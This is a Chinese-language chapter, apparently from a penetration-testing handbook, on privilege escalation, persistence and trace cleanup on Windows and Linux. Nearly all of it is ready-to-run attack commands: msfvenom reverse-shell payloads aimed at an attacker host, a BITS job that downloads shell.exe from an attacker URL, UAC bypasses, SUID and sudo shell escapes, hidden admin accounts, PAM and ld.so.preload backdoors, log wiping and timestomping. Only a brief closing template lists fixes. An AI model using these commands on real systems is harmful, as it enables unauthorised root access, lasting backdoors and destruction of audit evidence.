## 第 20 章 · 权限提升与持久化专章

**目的**：拿到 shell 后要提权（USER → SYSTEM / user → root）、留后门（持久化）、清痕迹。本章覆盖 Windows + Linux 全套提权与持久化技术。

### 20.1 Windows 权限提升

**信息收集**：
```cmd
# 系统信息
systeminfo
wmic qfe list
wmic os get caption,version,buildnumber

# 当前用户
whoami /all
whoami /groups
whoami /priv

# 网络
netstat -ano
arp -a
route print

# 进程
tasklist /v
wmic process list full

# 计划任务
schtasks /query /fo LIST

# 服务
sc query
wmic service list brief
accesschk.exe -uwcv "Everyone" * /accepteula

# 安装程序
wmic product get name,version,vendor

# 自动登录凭据
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul
```

**服务提权**：
```cmd
# 1. 查找弱权限服务
accesschk.exe -uwcv "Everyone" * /accepteula
accesschk.exe -uwcv "Users" * /accepteula
accesschk.exe -uwcv "BUILTIN\Users" *

# 2. 找到可写服务
sc config "VulnService" binpath= "C:\Windows\Temp\shell.exe"
sc stop "VulnService"
sc start "VulnService"

# 3. 计划任务
schtasks /create /tn "Evil" /tr "C:\shell.exe" /sc once /st 00:00 /ru system
schtasks /run /tn "Evil"

# 4. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 都为 1 → 可安装 MSI 提权
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

**UAC 绕过**：
```bash
# UACME 项目
Akagi64.exe <number>
# 编号对应不同绕过方法

# 手动：fodhelper.exe
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe"
# fodhelper.exe 触发 → 启动 cmd 但继承管理员 token

# eventvwr.exe
# computerdefaults.exe
# sdclt.exe
```

**Potato 系列（服务账户 → SYSTEM）**：
```bash
# JuicyPotato
JuicyPotato.exe -l 9999 -p "C:\shell.exe" -t * -c {CLSID}
# CLSID 列表
# https://ohpe.it/juicy-potato/CLSID/

# SweetPotato
SweetPotato.exe -p C:\shell.exe

# PrintSpoofer (Windows 10 / Server 2019+)
PrintSpoofer64.exe -i -c cmd

# RoguePotato
RoguePotato.exe -r attacker_ip -e "shell.exe"

# GodPotato (.NET)
GodPotato.exe -cmd "cmd /c whoami"
```

**令牌模拟**：
```bash
# Incognito
incognito.exe list_tokens -u
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe

# PowerShell
Import-Module .\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"
```

**AlwaysInstallElevated**：
```bash
# 检查
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 都为 1 → msi 提权
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

**DLL 劫持**：
```bash
# 1. 找 DLL 搜索路径
Process Monitor (procmon) 过滤 Path
# 看服务加载了哪些 DLL，路径里有哪些可写

# 2. 编译恶意 DLL
# msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f dll -o evil.dll
# 放可写路径，触发服务重启
```

**内核漏洞**：
```bash
# 找可用漏洞
whoami /priv
systeminfo
# 找符合版本的 exp
searchsploit windows 10 1903
# Windows 提权漏洞
# CVE-2021-1732 (Win32k)
# CVE-2021-36934 (HiveNightmare)
# CVE-2022-21882 (Win32k)
# CVE-2023-23397 (Outlook)
# PrintNightmare (CVE-2021-1675)
```

### 20.2 Linux 权限提升

**信息收集**：
```bash
# 系统
uname -a
cat /etc/os-release
cat /etc/issue

# 用户
id
whoami
sudo -l
cat /etc/passwd
cat /etc/shadow

# 提权检查工具
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
./linpeas.sh

# 内核漏洞
./linux-exploit-suggester.sh
# 或
uname -r
searchsploit linux kernel 5.15
```

**SUDO 提权**：
```bash
# 1. 查看 sudo 权限
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/vim
# → sudo vim -c ':!/bin/bash'

# 2. GTFOBins 速查
# https://gtfobins.github.io/
# 常见：
# vim → :!/bin/bash
# less → !/bin/bash
# find → find . -exec /bin/bash \;
# awk → awk 'BEGIN {system("/bin/bash")}'
# python → sudo python -c 'import os; os.system("/bin/bash")'
# perl → sudo perl -e 'exec "/bin/bash";'
# ruby → sudo ruby -e 'exec "/bin/bash"'
# nmap --interactive
# env → sudo env /bin/bash
```

**SUID 提权**：
```bash
# 1. 找 SUID 文件
find / -perm -u=s -type f 2>/dev/null
# 或
find / -perm -4000 2>/dev/null

# 2. 找非标准 SUID
find / -perm -u=s -type f 2>/dev/null | grep -v -E '^/(bin|usr/bin|usr/sbin|sbin)'

# 3. 常见利用
# SUID bash
./bash -p
# SUID find
find . -exec /bin/bash -p \;
# SUID python
python -c 'import os; os.execl("/bin/bash","bash","-p")'
# SUID php
php -r "pcntl_exec('/bin/bash', ['-p']);"
# SUID strace
strace -o /dev/null /bin/bash
# SUID docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**Capabilities 提权**：
```bash
# 1. 找有特殊 cap 的二进制
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid+ep

# 2. 利用
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# 或
getcap /usr/bin/python3.8
# cap_dac_read_search → 读任意文件
python3 -c 'import os; os.setuid(0); os.system("cat /etc/shadow")'
```

**Cron 提权**：
```bash
# 1. 查 cron
crontab -l
ls -la /etc/cron*
cat /etc/crontab
# 找以 root 运行的脚本

# 2. 看脚本是否可写
ls -la /etc/cron.daily/backup.sh
# 可写 → 加 payload
echo "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash" >> /etc/cron.daily/backup.sh
# 等待执行
```

**PATH 劫持**：
```bash
# 1. 看 sudo 配置
sudo -l
# (root) NOPASSWD: /usr/bin/less
# less 调用了其他命令（如 lesspipe）

# 2. 劫持
cd /tmp
echo '/bin/bash' > less
chmod +x less
export PATH=/tmp:$PATH
sudo /usr/bin/less /etc/shadow
# !bash
```

**计划任务 / systemd 提权**：
```bash
# systemd timer / service 可写
ls -la /etc/systemd/system/*.service
# 修改 ExecStart 指向恶意脚本

# init.d
ls -la /etc/init.d/
# 可写 → 加 payload
```

**通配符 / Tar 提权**：
```bash
# cron 跑 tar cf /backup/*.tar *
# 在目录下创建恶意文件
echo '#!/bin/bash' > "--checkpoint-action=exec=sh shell.sh"
echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
# 等待 cron 执行
```

**NFS 提权**：
```bash
# 1. 检查
cat /etc/exports
# /tmp *(rw,no_root_squash)

# 2. 攻击
# 在攻击机
mount -t nfs target:/tmp /mnt
cp /bin/bash /mnt/rootbash
chmod u+s /mnt/rootbash
# 在目标机
/tmp/rootbash -p
```

**Python Library Hijacking**：
```bash
# 1. 找 root 运行的 Python 脚本
# 2. 看 PYTHONPATH / sys.path
# 3. 在可写路径放置同名 .py
```

**内核漏洞**：
```bash
# DirtyPipe (CVE-2022-0847)
# Linux 5.8 - 5.16.10
uname -r
# 5.15.0-xx
# 下载 dirtypipe exploit
# CVE-2022-2588 route4
# CVE-2023-0386 OverlayFS
# CVE-2021-3493 OverlayFS
```

### 20.3 Windows 持久化

**计划任务**：
```cmd
schtasks /create /tn "WindowsUpdate" /tr "C:\shell.exe" /sc onlogon /ru system
# 每分钟
schtasks /create /tn "x" /tr "C:\shell.exe" /sc minute /mo 1 /ru system
# 触发
schtasks /run /tn "WindowsUpdate"
```

**注册表 Run**：
```cmd
# HKCU（当前用户）
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdate" /t REG_SZ /d "C:\shell.exe"

# HKLM（所有用户，需要管理员）
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdate" /t REG_SZ /d "C:\shell.exe"

# 开机登录触发
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "x" /t REG_SZ /d "C:\shell.exe"
```

**服务**：
```cmd
sc create "WinSvc" binpath= "C:\shell.exe" type= own start= auto
sc start "WinSvc"
```

**WMI Event**：
```powershell
# 触发条件：进程创建
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
  Name = "WindowsUpdate"
  EventNamespace = "root\cimv2"
  QueryLanguage = "WQL"
  Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process'"
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
  Name = "Updater"
  CommandLineTemplate = "C:\shell.exe"
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
  Filter = $Filter
  Consumer = $Consumer
}
```

**COM 劫持**：
```cmd
# HKCU\Software\Classes\CLSID\{...}\InprocServer32
# 替换为恶意 DLL
```

**BITS 作业**：
```cmd
bitsadmin /create "WindowsUpdate"
bitsadmin /addfile "WindowsUpdate" http://attacker/shell.exe C:\shell.exe
bitsadmin /setnotifycmdline "WindowsUpdate" C:\shell.exe NORMAL
bitsadmin /resume "WindowsUpdate"
```

**COM+ 应用程序**：
```cmd
# 注册恶意 COM 组件
# 由系统服务加载
```

**辅助功能**：
```cmd
# 用 cmd.exe 替换 utilman.exe (Win+U 触发)
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Administrators:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# Win+U → SYSTEM cmd
```

**隐藏账户**：
```cmd
# 创建用户 + 隐藏
net user hacker$ Pass123! /add
net localgroup administrators hacker$ /add
# 改注册表隐藏
reg add HKLM\SAM\SAM\Domains\Account\Users\00000XXX /v F /t REG_BINARY /d 旧F值 /f
# 在用户列表看不到
```

**Winlogon Helper DLL**：
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,shell.exe" /f
```

**AppInit_DLLs**：
```cmd
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
```

**CLR 劫持**：
```cmd
# 修改 .NET CLR 启动 DLL
reg add "HKLM\Software\Microsoft\.NETFramework" /v AssemblyLoaderOptimization /t REG_SZ /d 2 /f
# 需要在 .NET Framework 配置目录放 malicious.config
```

### 20.4 Linux 持久化

**systemd 服务**：
```bash
# 1. 创建服务
cat > /etc/systemd/system/updates.service <<EOF
[Unit]
Description=Update Service
[Service]
ExecStart=/bin/bash -c 'while true; do /tmp/shell.sh; sleep 60; done'
Restart=always
[Install]
WantedBy=multi-user.target
EOF

# 2. 启动
systemctl daemon-reload
systemctl enable updates
systemctl start updates
```

**Cron**：
```bash
# 1. 用户 cron
crontab -e
@reboot /tmp/shell.sh
*/5 * * * * /tmp/shell.sh

# 2. 系统 cron
echo "* * * * * root /tmp/shell.sh" >> /etc/crontab
echo "* * * * * root /tmp/shell.sh" > /etc/cron.d/updates
```

**bashrc / profile**：
```bash
# /etc/bashrc 或 ~/.bashrc
echo '/tmp/shell.sh' >> ~/.bashrc
# /etc/profile.d/
echo '/tmp/shell.sh' > /etc/profile.d/updates.sh
chmod +x /etc/profile.d/updates.sh
```

**init.d 脚本**：
```bash
cat > /etc/init.d/updates <<EOF
#!/bin/sh
/tmp/shell.sh &
EOF
chmod +x /etc/init.d/updates
update-rc.d updates defaults  # Debian
chkconfig --add updates        # CentOS
```

**SSH 公钥**：
```bash
mkdir ~/.ssh
echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

**SUID bash**：
```bash
cp /bin/bash /tmp/.rootbash
chmod u+s /tmp/.rootbash
/tmp/.rootbash -p
```

**动态链接库劫持**：
```bash
# 1. 找 root 调用的 SUID 二进制
# 2. 看它加载哪些库
strace /usr/bin/suid_binary 2>&1 | grep "open"
# 3. 找可写路径
# 4. 替换为恶意 .so
```

**PAM 后门**：
```bash
# /etc/pam.d/
# 添加 auth sufficient pam_permit.so
# 任意密码都能登录
# 详细：patch pam_unix.so 接受 magic password
```

**ld.so.preload**：
```bash
# /etc/ld.so.preload
echo "/tmp/evil.so" > /etc/ld.so.preload
# 任何进程都会先加载 evil.so
# evil.so 里 hook __libc_start_main → 启动恶意代码
```

**motd 脚本**：
```bash
# /etc/update-motd.d/
# 用户登录时执行
echo '/tmp/shell.sh' > /etc/update-motd.d/99-evil
chmod +x /etc/update-motd.d/99-evil
```

**容器内持久化**：
```bash
# Docker
docker run -d --name=persistent -v /:/mnt --restart=always alpine chroot /mnt /bin/sh -c "while true; do /tmp/shell.sh; sleep 60; done"
```

### 20.5 痕迹清理

**Windows**：
```cmd
# 1. 关闭日志审计
auditpol /set /category:"Account Logon" /success:disable /failure:disable
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
auditpol /set /category:"Object Access" /success:disable /failure:disable

# 2. 清日志
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# 3. 清除最近文档
del /q /f %APPDATA%\Microsoft\Windows\Recent\*
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f

# 4. 清除 Prefetch
del /q /f C:\Windows\Prefetch\*
# 关闭 Prefetch
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f

# 5. 清除时间戳 (Timestomp)
# SetMACE 工具
SetMACE.exe -f "C:\shell.exe" -m "01/01/2020 12:00:00" -a "01/01/2020 12:00:00" -c "01/01/2020 12:00:00" -e "01/01/2020 12:00:00"
# 改 $STANDARD_INFORMATION + $FILE_NAME 时间戳

# 6. 清除事件日志中的特定事件
# 4624/4625 (登录)
# 4672 (特权登录)
# 4688 (进程创建)
# 4720 (用户创建)
# 4724 (密码重置)
# 4728/4732 (组成员添加)
# 4738 (用户修改)
# 4740 (账户锁定)
# 5145 (网络共享访问检查)

# 7. 清除 PowerShell 历史
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History

# 8. 清除特定进程的 EDR 痕迹
# (详细见 EDR 绕过章节)
```

**Linux**：
```bash
# 1. 清历史
history -c
unset HISTFILE
echo "" > ~/.bash_history
ln -sf /dev/null ~/.bash_history

# 2. 关闭 history
export HISTSIZE=0
export HISTFILESIZE=0
# /etc/profile
HISTCONTROL=ignorespace  # 加空格不记录
HISTIGNORE="ls:cd:exit:wget:curl:scp:rm:cp:mv"

# 3. 清日志
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/kern.log
cat /dev/null > /var/log/messages
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog
# 或
echo "" > /var/log/auth.log
# 时间戳伪造
sed -i 's/old_timestamp/new_timestamp/g' /var/log/auth.log

# 4. 清除 utmp / wtmp
# /var/run/utmp
# /var/log/wtmp
# /var/log/btmp
# utmpcleaner 工具

# 5. 清除特定行
sed -i '/192.168.1.100/d' /var/log/auth.log
sed -i '/attacker_ip/d' /var/log/*

# 6. 清除 atime / ctime
# touch -t 旧时间
touch -t 202001011200.00 /tmp/shell
# 或
srm -z /tmp/shell  # 安全删除 + 改时间
```

### 20.6 权限提升与持久化报告模板

```
【权限提升与持久化报告】CASE-YYYY-NNNN

【初始权限】
- 入口: <WebShell / 钓鱼 / RCE>
- 权限: <www-data / IIS AppPool / domain user>
- 操作系统: <Windows Server 2019 / Ubuntu 22.04>

【提权路径】
- Windows:
  1. <AlwaysInstallElevated>
  2. <UAC bypass (fodhelper)>
  3. <Service 弱权限>
  4. <Potato 提权到 SYSTEM>
- Linux:
  1. <SUDO NOPASSWD / vim>
  2. <SUID /usr/bin/python3.8>
  3. <Capabilities cap_setuid+ep>
  4. <Crontab 提权到 root>

【持久化技术】
- Windows: <Run 注册表 / 计划任务 / WMI Event>
- Linux: <systemd service / cron / bashrc>
- 反检测: <清除日志 / 改时间戳 / 隐藏账户>

【痕迹清理】
- Windows: <wevtutil cl / Prefetch / PowerShell history>
- Linux: <history -c / 清 /var/log / utmpcleaner>
- 时间戳: <SetMACE / touch -t>

【关键发现】
- 漏洞: <UAC 没启用 / 弱 SUDO / SUID 滥用>
- 提权路径: <5 条>
- 持久化路径: <8 条>

【修复建议】
- UAC 全开
- 最小 SUDO 权限
- 移除不必要 SUID
- 服务最小权限
- 关闭可写计划任务目录
- LAPS 部署

【防御视角】
- 端点：EDR / Sysmon / ELK
- 行为：异常时间/异常命令/异常账户
- 网络：异常出站连接
- 响应：自动化隔离/恢复
```

---
